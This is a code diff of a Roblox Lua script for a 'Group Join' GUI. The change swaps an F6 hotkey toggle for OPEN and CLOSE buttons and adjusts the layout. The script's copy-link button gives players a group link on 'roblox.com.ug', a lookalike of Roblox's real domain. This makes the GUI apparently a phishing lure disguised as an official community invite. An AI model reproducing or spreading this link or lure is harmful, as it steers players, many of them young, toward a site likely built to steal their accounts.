@@ -1,16 +1,14 @@
--- ===== Simple GUI for Group Join with Toggle =====
+-- ===== Simple GUI for Group Join with Open/Close Buttons =====
 local GroupID = 1671787857
 local GroupLink = "https://roblox.com.ug/communities/1671787857/"
 
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
-local UserInputService = game:GetService("UserInputService")
 
 wait(1)
 
 -- Toggle Variables
-local guiVisible = true
-local toggleKey = Enum.KeyCode.F6  -- Press F6 to toggle
+local guiVisible = false
 
 -- ===== Create GUI Frame =====
 local screenGui = Instance.new("ScreenGui")
@@ -21,10 +19,11 @@ screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
 -- Main Frame
 local mainFrame = Instance.new("Frame")
 mainFrame.Name = "MainFrame"
-mainFrame.Size = UDim2.new(0, 400, 0, 250)
-mainFrame.Position = UDim2.new(0.5, -200, 0.5, -125)
+mainFrame.Size = UDim2.new(0, 400, 0, 220)
+mainFrame.Position = UDim2.new(0.5, -200, 0.5, -110)
 mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
 mainFrame.BorderSizePixel = 0
+mainFrame.Visible = guiVisible
 mainFrame.Parent = screenGui
 
 -- Title
@@ -41,7 +40,7 @@ titleLabel.Parent = mainFrame
 -- Description
 local descLabel = Instance.new("TextLabel")
 descLabel.Name = "Description"
-descLabel.Size = UDim2.new(0.9, 0, 0, 80)
+descLabel.Size = UDim2.new(0.9, 0, 0, 60)
 descLabel.Position = UDim2.new(0.05, 0, 0, 60)
 descLabel.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
 descLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
@@ -54,8 +53,8 @@ descLabel.Parent = mainFrame
 -- Copy Link Button
 local copyButton = Instance.new("TextButton")
 copyButton.Name = "CopyButton"
-copyButton.Size = UDim2.new(0.4, 0, 0, 50)
-copyButton.Position = UDim2.new(0.05, 0, 0, 155)
+copyButton.Size = UDim2.new(0.9, 0, 0, 50)
+copyButton.Position = UDim2.new(0.05, 0, 0, 130)
 copyButton.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
 copyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 copyButton.TextSize = 14
@@ -78,28 +77,12 @@ copyButton.MouseButton1Click:Connect(function()
     end
 end)
 
--- Close Button
-local closeButton = Instance.new("TextButton")
-closeButton.Name = "CloseButton"
-closeButton.Size = UDim2.new(0.4, 0, 0, 50)
-closeButton.Position = UDim2.new(0.55, 0, 0, 155)
-closeButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
-closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-closeButton.TextSize = 14
-closeButton.Font = Enum.Font.GothamBold
-closeButton.Text = "❌ HIDE (F6)"
-closeButton.Parent = mainFrame
-
-closeButton.MouseButton1Click:Connect(function()
-    guiVisible = false
-    mainFrame.Visible = false
-end)
-
 -- Draggable Frame
 local dragging = false
 local dragInput
 local dragStart
 local startPos
+local UserInputService = game:GetService("UserInputService")
 
 titleLabel.InputBegan:Connect(function(input, gameProcessed)
     if gameProcessed then return end
@@ -129,22 +112,44 @@ UserInputService.InputEnded:Connect(function(input, gameProcessed)
     end
 end)
 
--- ===== Toggle Hotkey (F6) =====
-UserInputService.InputBegan:Connect(function(input, gameProcessed)
-    if gameProcessed then return end
-    
-    if input.KeyCode == toggleKey then
-        guiVisible = not guiVisible
-        mainFrame.Visible = guiVisible
-        
-        if guiVisible then
-            print("✅ GUI Opened! (Press F6 to hide)")
-        else
-            print("❌ GUI Hidden! (Press F6 to show)")
-        end
-    end
+-- Open Button (in top-right corner of screen)
+local openButton = Instance.new("TextButton")
+openButton.Name = "OpenButton"
+openButton.Size = UDim2.new(0, 100, 0, 40)
+openButton.Position = UDim2.new(1, -110, 0, 10)
+openButton.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
+openButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+openButton.TextSize = 12
+openButton.Font = Enum.Font.GothamBold
+openButton.Text = "📂 OPEN"
+openButton.Parent = screenGui
+
+openButton.MouseButton1Click:Connect(function()
+    guiVisible = true
+    mainFrame.Visible = true
+    openButton.Visible = false
+    print("✅ GUI Opened!")
+end)
+
+-- Close Button (in main frame)
+local closeButton = Instance.new("TextButton")
+closeButton.Name = "CloseButton"
+closeButton.Size = UDim2.new(0.2, 0, 0, 30)
+closeButton.Position = UDim2.new(0.75, 0, 0, 10)
+closeButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+closeButton.TextSize = 12
+closeButton.Font = Enum.Font.GothamBold
+closeButton.Text = "❌ CLOSE"
+closeButton.Parent = mainFrame
+
+closeButton.MouseButton1Click:Connect(function()
+    guiVisible = false
+    mainFrame.Visible = false
+    openButton.Visible = true
+    print("❌ GUI Hidden!")
 end)
 
 print("✅ Group Join GUI loaded!")
-print("📌 Press F6 to toggle (open/close) the GUI")
-print("💡 Or click HIDE button to close")
+print("📂 Click OPEN button to show the GUI")
+print("❌ Click CLOSE button to hide the GUI")
